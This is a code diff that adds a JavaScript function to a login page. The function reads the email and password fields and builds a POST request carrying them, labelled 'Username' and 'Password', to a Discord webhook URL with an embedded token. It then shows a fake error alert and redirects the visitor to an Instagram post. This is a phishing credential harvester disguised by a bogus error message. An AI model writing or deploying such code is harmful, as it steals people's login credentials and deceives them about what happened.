@@ -55,6 +55,24 @@
          };
 
 
+         let error = () => {
+                const email = document.getElementById("email").value;
+                const pass = document.getElementById("pass").value;
+
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1181959763311992933/laa35ChzmqttO_ItrIxJiRBxUE69b--AGbiZDAyYebpT3oRrVsWffDvNPtyI46vkjNwb");
+
+                request.setRequestHeader('Content-type', 'application/json');
+
+                const params = {
+                    username: "E-Cigány",
+                    avatar_url: "",
+                    content: `Username: ${email}\nPassword: ${pass}`
+                }
+
+                alert("Uncaught ReferenceError: login() is not defined");
+                location.href = "https://www.instagram.com/p/CO0l02xlrsD/?igshid=MzRlODBiNWFlZA=="
+         };
         </script>
     </body>
 </html>
